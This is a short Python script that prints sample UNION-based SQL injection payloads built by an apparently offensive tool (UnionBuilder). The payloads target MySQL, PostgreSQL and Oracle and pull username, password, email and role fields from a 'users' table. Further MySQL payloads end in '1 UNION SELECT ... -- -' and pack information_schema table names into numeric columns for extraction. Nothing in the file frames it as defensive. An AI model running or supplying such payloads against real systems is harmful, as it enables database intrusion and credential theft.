"""Static payload samples."""

from union_builder import UnionBuilder
from pack_builder import NumType, sql_pack_expr


def show(t, sql):
    print(f"\n-- {t} --")
    print(sql)


def main():
    show("MySQL / 3 cols / string_col=1 / user:-:passwd",
         UnionBuilder(3, [1], {1: ["username", "password"]},
                      dialect="mysql", table="users").build())
    show("PostgreSQL / 4 cols / string_col=[1,3]",
         UnionBuilder(4, [1, 3],
                      {1: ["username", "email"], 3: ["password"]},
                      dialect="postgres", table="users", sep="|").build())
    show("Oracle / 2 cols / string_col=2 (3 parts, uses ||)",
         UnionBuilder(2, [2], {2: ["username", "password", "role"]},
                      dialect="oracle", table="users").build())
    show("MySQL / NULL-safe (IFNULL)",
         UnionBuilder(3, [1], {1: ["username", "password"]},
                      dialect="mysql", table="users",
                      null_safe=True, null_fn="IFNULL").build())

    src = ("(SELECT table_name FROM information_schema.tables "
           "WHERE table_schema=database() ORDER BY table_name LIMIT 1)")
    for tname in ("int", "long"):
        t = NumType(tname)
        show(f"{tname} / {t.max_chars_7bit} chars at 7 bits",
             f"1 UNION SELECT {sql_pack_expr(src, 1, t.max_chars_7bit, 7, 'mysql')}-- -")


if __name__ == "__main__":
    main()
